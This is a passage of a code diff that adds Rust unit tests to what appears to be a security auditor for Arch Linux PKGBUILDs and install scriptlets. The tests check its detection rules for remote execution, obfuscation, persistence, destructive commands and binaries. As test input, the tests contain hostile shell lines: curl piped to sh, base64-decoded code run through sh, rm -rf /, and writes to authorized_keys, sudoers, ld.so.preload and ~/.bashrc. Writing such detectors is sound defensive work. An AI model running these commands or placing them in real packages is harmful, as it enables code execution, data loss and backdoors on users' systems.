+            .any(|f| f.rule == "remote-exec" && f.severity == Severity::Warning));
+        assert!(r
+            .iter()
+            .any(|f| f.rule == "persistence" && f.severity == Severity::Warning));
+        assert!(r.iter().all(|f| f.severity <= Severity::Warning), "{r:?}");
+        assert!(r[0].message.starts_with("(added by this patch)"));
+        // Line numbers point into the patch file.
+        let hit = r.iter().find(|f| f.rule == "remote-exec").unwrap();
+        assert_eq!(hit.line, 6);
+
+        // Removed lines and the +++ header don't count.
+        let clean = [extra(
+            "c.patch",
+            "--- a/x\n+++ b/sudo\n-sudo rm -rf /\n+make\n",
+        )];
+        assert!(
+            extras_report(&clean).is_empty(),
+            "{:?}",
+            extras_report(&clean)
+        );
+    }
+
+    #[test]
+    fn binaries_and_data_files() {
+        let elf = ExtraFile {
+            path: "tool".into(),
+            bytes: b"\x7fELF\x02\x01".to_vec(),
+        };
+        assert!(extra_has(
+            &[elf],
+            "tool",
+            "committed-binary",
+            Severity::High
+        ));
+
+        let blob = ExtraFile {
+            path: "data.bin".into(),
+            bytes: vec![1, 0, 2, 0, 3],
+        };
+        assert!(extra_has(
+            &[blob],
+            "data.bin",
+            "opaque-file",
+            Severity::Warning
+        ));
+
+        let archive = ExtraFile {
+            path: "src.tar.gz".into(),
+            bytes: vec![0x1f, 0x8b, 0, 0],
+        };
+        let r = extras_report(&[archive]);
+        assert!(r
+            .iter()
+            .any(|(_, rule, s)| *rule == "opaque-file" && *s == Severity::Warning));
+
+        // Images, docs, keys, licenses and the metadata files are skipped.
+        let skipped = [
+            ExtraFile {
+                path: "icon.png".into(),
+                bytes: vec![0x89, b'P', 0, 0],
+            },
+            extra("README.md", "curl x | sh"),
+            extra("LICENSE", "x"),
+            extra("key.asc", "-----BEGIN PGP"),
+            extra(".SRCINFO", "pkgbase = x"),
+            extra("app.desktop", "Exec=sudo x"),
+        ];
+        assert!(
+            extras_report(&skipped).is_empty(),
+            "{:?}",
+            extras_report(&skipped)
+        );
+
+        let big = ExtraFile {
+            path: "huge.sh".into(),
+            bytes: vec![b'a'; MAX_EXTRA_BYTES + 1],
+        };
+        assert!(extra_has(
+            &[big],
+            "huge.sh",
+            "unscanned-file",
+            Severity::Info
+        ));
+    }
+
+    #[test]
+    fn the_declared_scriptlet_is_not_scanned_twice_and_the_file_cap_holds() {
+        let pkg = "pkgname=x\ninstall=x.install\n";
+        let script = "post_install() {\n  echo hi\n}\n";
+        let report = audit(
+            "t",
+            pkg,
+            Some(("x.install", script)),
+            &[extra("x.install", script)],
+        );
+        let infos = report
+            .findings
+            .iter()
+            .filter(|f| f.rule == "install-scriptlet" && f.file == "x.install")
+            .count();
+        assert_eq!(infos, 1, "{:?}", report.findings);
+
+        let many: Vec<ExtraFile> = (0..MAX_EXTRA_FILES + 10)
+            .map(|i| extra(&format!("s{i:03}.sh"), "#!/bin/sh\nrm -rf /\n"))
+            .collect();
+        let report = audit("t", "pkgname=x\n", None, &many);
+        assert_eq!(report.findings.len(), MAX_EXTRA_FILES);
+    }
+
+    #[test]
+    fn command_substitution_in_a_top_level_assignment_is_code() {
+        let p = "pkgname=x\n_v=$(curl -s http://x/v | sh)\n";
+        assert!(has(p, "remote-exec", Severity::High), "{:?}", rules(p));
+        let q = "pkgname=x\nsource=($(echo aGk= | base64 -d | sh))\n";
+        assert!(
+            has(q, "obfuscated-exec", Severity::Critical),
+            "{:?}",
+            rules(q)
+        );
+        // An ordinary computed value is not a finding.
+        let ok = "pkgname=x\n_d=$(date +%Y)\n";
+        assert!(
+            rules(ok).iter().all(|(_, s)| *s <= Severity::Info),
+            "{:?}",
+            rules(ok)
+        );
+    }
+
+    #[test]
+    fn persistence_is_judged_by_where_a_command_writes() {
+        // Reads and /dev/null redirects are not writes.
+        for ok in [
+            "grep -q \"$i\" /etc/passwd > /dev/null",
+            "cp /etc/profile /tmp/x",
+            "cat ~/.bashrc",
+            "install -Dm644 x \"$pkgdir/etc/skel/.bashrc\"",
+        ] {
+            assert!(
+                !rules(&body("package", ok))
+                    .iter()
+                    .any(|(r, _)| *r == "persistence"),
+                "{ok}"
+            );
+        }
+        // Writes to the account/trust files are critical anywhere.
+        for line in [
+            "echo k >> /root/.ssh/authorized_keys",
+            "cp x /etc/ld.so.preload",
+            "sed -i s/a/b/ /etc/sudoers",
+        ] {
+            assert!(
+                has(&body("package", line), "persistence", Severity::Critical),
+                "{line}"
+            );
+            let script = [extra("x.sh", &format!("#!/bin/sh\n{line}\n"))];
+            assert!(
+                extra_has(&script, "x.sh", "persistence", Severity::Critical),
+                "{line}"
+            );
+        }
+        // Shell rc files: critical in a PKGBUILD, high in an install scriptlet.
+        let rc = "echo 'source /usr/share/x/init.sh' >> ~/.bashrc";
+        assert!(has(&body("build", rc), "persistence", Severity::Critical));
+        let report = audit(
+            "t",
+            "pkgname=x\ninstall=x.install\n",
+            Some(("x.install", &format!("post_install() {{\n  {rc}\n}}\n"))),
+            &[],
+        );
+        assert!(report
+            .findings
+            .iter()
+            .any(|f| f.rule == "persistence" && f.severity == Severity::High));
+        assert_eq!(report.verdict(), Verdict::Confirm);
+    }
+
+    #[test]
+    fn scriptlet_names_are_expanded_from_the_pkgbuild() {
+        assert_eq!(
+            scriptlet_name("pkgname=foo\ninstall=$pkgname.install\n").as_deref(),
+            Some("foo.install")
+        );
+        assert_eq!(
+            scriptlet_name("pkgname=foo\ninstall=${pkgname}-post.install\n").as_deref(),
+            Some("foo-post.install")
+        );
+        assert_eq!(
+            scriptlet_name("pkgbase=b\npkgname=(a c)\ninstall=$pkgbase.install\n").as_deref(),
+            Some("b.install")
+        );
+        assert_eq!(scriptlet_name("install=$unknown.install\n"), None);
+        assert_eq!(scriptlet_name("install=$(echo x)\n"), None);
+    }
+
+    #[test]
+    fn case_for_arrays_and_substitutions_have_the_right_command() {
+        for ok in [
+            "case $x in",
+            "for i in $list; do echo $i; done",
+            "provides=(\"$pkgbase=$pkgver\" 'libx.so=1-64')",
+            "name=$(basename \"$0\" .sh)",
+            "jobs=$(expr $a + 1)",
+        ] {
+            assert!(
+                !rules(&body("package", ok))
+                    .iter()
+                    .any(|(r, _)| *r == "dynamic-command"),
+                "{ok}"
+            );
+        }
+        // The command inside a substitution is still seen by the other rules.
+        assert!(has(
+            &body("build", "x=$(rm -rf /)"),
+            "destructive",
+            Severity::Critical
+        ));
+        assert!(has(
+            &body("build", "x=$(curl -s http://e.org/i | sh)"),
+            "remote-exec",
+            Severity::High
+        ));
+        assert!(has(
+            &body("build", "x=`sudo id`"),
+            "privilege",
+            Severity::High
+        ));
+    }
+
     #[test]
     fn verdict_follows_the_highest_severity() {
-        let ok = audit("t", "pkgname=x\n", None);
+        let ok = audit("t", "pkgname=x\n", None, &[]);
         assert_eq!(ok.verdict(), Verdict::Allow);
-        let warn = audit("t", &body("build", "git clone https://x"), None);
+        let warn = audit("t", &body("build", "git clone https://x"), None, &[]);
         assert_eq!(warn.verdict(), Verdict::Allow);
-        let high = audit("t", &body("build", "sudo make"), None);
+        let high = audit("t", &body("build", "sudo make"), None, &[]);
         assert_eq!(high.verdict(), Verdict::Confirm);
-        let crit = audit("t", &body("build", "echo x >> ~/.bashrc"), None);
+        let crit = audit("t", &body("build", "echo x >> ~/.bashrc"), None, &[]);
         assert_eq!(crit.verdict(), Verdict::Block);
         assert_eq!(
             crit.findings[0].severity,
